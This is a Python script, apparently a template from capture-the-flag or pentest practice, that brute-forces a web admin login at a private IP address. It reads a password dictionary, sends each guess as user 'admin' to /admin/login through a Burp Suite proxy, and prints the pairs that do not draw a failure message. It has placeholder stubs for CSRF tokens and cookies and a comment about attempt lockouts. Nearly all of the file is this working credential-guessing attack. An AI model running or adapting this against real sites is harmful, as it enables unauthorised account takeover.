import requests
import re
import random

HOST = '192.168.100.154'
USER = 'admin'
PROXY = { 'http': '127.0.0.1:8080' }


def init_session():

	# Get request
	r = requests.get(f'http://{HOST}/admin/')
	
	# Looks for specific text on the get
	csrf = re.search(r'', r.text)
	# This returns a group, so we obtain the first one
	csrf = csrf.group(1)

	#This gets the cookie
	cookie = r.cookies.get('Name of the key')
	
	# Return the csrf and the cookie
	return csrf, cookie


def login(user, password):

	# Obtains a cookie and csrf
	#csrf, cookie = init_session()

	# In case you need specific headers
	headers = {

	}

	# Data
	data = {
		# You have to set variables in here
		# tokenCSRF
		'username': user,
		'password': password,

	}

	#Cookies
	cookies = {
		# 'cookie_name': cookie,
	}

	# This is the post
	r = requests.post(f'http://{HOST}/admin/login', data=data, cookies=cookies, headers=headers, allow_redirects=False,proxies=PROXY )  # ,proxies=PROXY   <- Can be added to see it on burpsuite

	# Then return the status or success
	if r.status_code != 200:
		print("ERROR 200")
	elif "password incorrect" in r.text:
		return False
	elif "has been blocked" in r.text:
		# In case there is a attempt limit
		return True
	else:
		print(f"{USER}:{password}")
		return True

# opens dictionary
wl = open('dictionary').readlines()

# Loops dictionary
for line in wl:
	# Strip each line
	line = line.strip()
	# Call the function
	print(login('admin', line))
